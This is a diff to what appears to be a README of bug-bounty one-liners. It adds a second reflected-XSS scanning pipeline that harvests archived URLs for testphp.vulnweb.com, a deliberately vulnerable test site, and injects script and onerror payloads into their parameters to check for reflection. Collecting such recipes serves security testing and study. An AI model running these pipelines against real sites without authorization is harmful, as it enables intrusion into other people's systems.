@@ -46,6 +46,10 @@ echo "testphp.vulnweb.com" | waybackurls | gf xss | uro | qsreplace '"><script>c
 ## Reflected XSS Oneliner Command2
 ```
 echo "testphp.vulnweb.com" | waybackurls | uro | gf allparam | grep "=" | gf blacklist | qsreplace '"><script>confirm(1)</script>' | xsschecker -match '"><script>confirm(1)</script>' -vuln
+
+or
+
+echo "testphp.vulnweb.com" | waybackurls | uro | gf allparam | grep "=" | gf blacklist | qsreplace '"><script>confirm(1)</script>' | xsschecker -match '"><script>confirm(1)</script>, "<image/src/onerror=confirm(1)>' -vuln
 ```
 
 ## Reflected XSS Oneliner Command1 and Reflected XSS Oneliner Command2 Results Comparison
